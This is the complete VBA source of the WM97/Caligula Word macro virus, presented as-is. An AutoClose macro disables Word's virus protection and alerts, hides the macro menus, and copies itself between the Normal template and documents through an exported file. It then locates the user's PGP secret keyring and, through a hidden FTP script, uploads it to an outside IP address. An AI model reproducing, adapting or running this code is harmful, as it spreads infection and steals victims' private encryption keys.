   Attribute VB_Name = "Caligula"
   Sub AutoClose()

   On Error Resume Next

   With Dialogs(wdDialogFileSummaryInfo)
   .Author = "Opic"
   .Title = "WM97/Caligula Infection"
   .Subject = "A Study In Espionage Enabled Viruses."
   .Comments = "The Best Security Is Knowing The Other Guy Hasn't Got Any."
   .Keywords = " | Caligula | Opic | CodeBreakers | "
   .Execute
   End With

   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   Options.ConfirmConversions = False

   Application.ScreenUpdating = False
   Application.DisplayStatusBar = False
   Application.DisplayAlerts = False

   CommandBars("tools").Controls("Macro").Enabled = False
   CommandBars("tools").Controls("Customize...").Enabled = False
   CommandBars("view").Controls("Toolbars").Enabled = False
   CommandBars("view").Controls("Status Bar").Enabled = False

   If NormalTemplate.VBProject.VBComponents.Item("Caligula").Name <> "Caligula" Then
   NotInNorm = True
   ActiveDocument.VBProject.VBComponents("Caligula").Export "c:\io.vxd"
   Set Dobj = NormalTemplate.VBProject
   ElseIf ActiveDocument.VBProject.VBComponents.Item("Caligula").Name <> "Caligula" Then
   NotInActiv = True
   NormalTemplate.VBProject.VBComponents("Caligula").Export "c:\io.vxd"
   Set Dobj = ActiveDocument.VBProject
   End If

   If NotInNorm = True Or NotInActiv = True Then Dobj.VBComponents.Import ("c:\io.vxd")

   If Day(Now) = 31 Then MsgBox "No cia," & vbCr & "No nsa," & vbCr & "No satellite," & vbCr & "Could map our veins.", 0, "WM97/Caligula (c) Opic [CodeBreakers 1998]"

   If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Caligula") = False) Then

   pgppath = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PGP Encrypted File\shell\open\command", "")
   Position = InStr(1, pgppath, "pgpt")

   If Position <> 0 Then
   pgppath = Mid(pgppath, 1, Position - 2)
   Else
   GoTo noPGP
   End If

   With Application.FileSearch
       .FileName = "\Secring.skr"
       .LookIn = pgppath
       .SearchSubFolders = True
       .MatchTextExactly = True
       .FileType = msoFileTypeAllFiles
       .Execute
       PGP_Sec_Key = .FoundFiles(1)
   End With

   Randomize
     For i = 1 To 4
       NewSecRingFile = NewSecRingFile + Mid(Str(Int(8 * Rnd)), 2, 1)
     Next i
     NewSecRingFile = "./secring" & NewSecRingFile & ".skr"

   Open "c:\cdbrk.vxd" For Output As #1
       Print #1, "o 209.201.88.110"
       Print #1, "user anonymous"
       Print #1, "pass itsme@"
       Print #1, "cd incoming"
       Print #1, "binary"
       Print #1, "put """ & PGP_Sec_Key & """ """ & NewSecRingFile & """"
       Print #1, "quit"
       Close #1

   Shell "command.com /c ftp.exe -n -s:c:\cdbrk.vxd", vbHide

   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Caligula") = True

   End If

   noPGP:

   If NotInActiv = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
   End Sub
   Sub ToolsMacro()
   End Sub
   Sub FileTemplates()
   End Sub
   Sub ViewVBCode()
   End Sub
